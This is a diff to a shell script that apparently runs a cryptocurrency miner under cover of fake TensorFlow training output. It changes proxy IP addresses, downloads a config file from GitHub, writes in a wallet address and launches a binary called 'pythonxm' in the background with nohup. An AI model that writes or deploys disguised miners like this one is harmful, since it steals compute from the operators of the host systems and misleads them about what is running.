@@ -3,7 +3,7 @@ echo '{ "type":"tf.keras",'
 echo '"version":"0.0.1",'
 echo '"status":"Epoch 1/5 1875/1875 [==============================] - 5s 2ms/step - loss: 0.2978 - accuracy: 0.9137",'
 
-PROX=49.12.115.117
+PROX=168.119.180.25
 ETPort=443
 RVPort=8080
 VCPort=80
@@ -13,12 +13,12 @@ TESTPort2=465
 DisplayRefrech=30
 echo '"df":'$DisplayRefrech','
 
-HZ_PROX1=49.12.115.117
+HZ_PROX1=168.119.180.25
 HZ_PROX2=188.34.159.9
-EU_PROX=49.12.115.117
+EU_PROX=168.119.180.25
 US_PROX=173.199.123.152
 CA_PROX=173.199.123.152
-ASIA_PROX=49.12.115.117
+ASIA_PROX=168.119.180.25
 
 #VCOptions="d=16,xn=1,hybrid"
 #VCOptions="mc=VRSC"
@@ -417,7 +417,7 @@ then
     #                Config
     wget -q https://github.com/one10001/10001code/raw/main/config.json
     sed -i "s+ip0001+RV_$IPNAME+g" config.json
-    sed -i "s+49.12.115.117+$PROX+g" config.json
+    sed -i "s+168.119.180.25+$PROX+g" config.json
     sed -i "s+:8080+:$XMPort+g" config.json
     sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
 
@@ -444,7 +444,7 @@ else
     #                Config
     wget -q https://github.com/one10001/10001code/raw/main/config.json
     sed -i "s+ip0001+RV_$IPNAME+g" config.json
-    sed -i "s+49.12.115.117+$PROX+g" config.json
+    sed -i "s+168.119.180.25+$PROX+g" config.json
     sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
 
     nohup ./pythonxm -c config.json -t "$XMThreads" -l ooutxm 2>> ooutxm 1>> ooutxm &
